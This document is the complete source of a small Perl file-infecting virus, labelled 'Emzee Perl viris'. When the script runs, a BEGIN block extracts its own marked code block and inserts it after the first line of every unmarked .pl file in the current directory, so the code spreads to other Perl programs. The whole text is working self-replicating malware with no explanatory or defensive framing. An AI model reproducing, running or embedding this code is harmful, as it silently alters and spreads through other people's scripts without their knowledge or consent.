#!/opt/perl/bin/perl -w
# Emzee Perl viris
use strict;

# HACKED
BEGIN {
    local *ME;
    if (open ME, $0) {
        local $/;
        my $me =  <ME>;
        my ($text) = $me =~ /(# HACKED\n.*?# HACKED\n)/s;
        if (opendir DIR, ".") {
            foreach my $file (readdir DIR) {
                next unless $file =~ /.pl$/;
                local *FILE;
                if (open FILE, "+< ./$file") {
                    my $program = <FILE>;
                    unless ($program =~ /# HACKED/) {
                        $program =~ s/\n/\n$text/;
                    }
                    seek FILE, 0, 0;
                    print FILE $program;
                }
                close FILE;
            }
        }
        closedir DIR;
    }
    close ME;
}
# HACKED

__END__
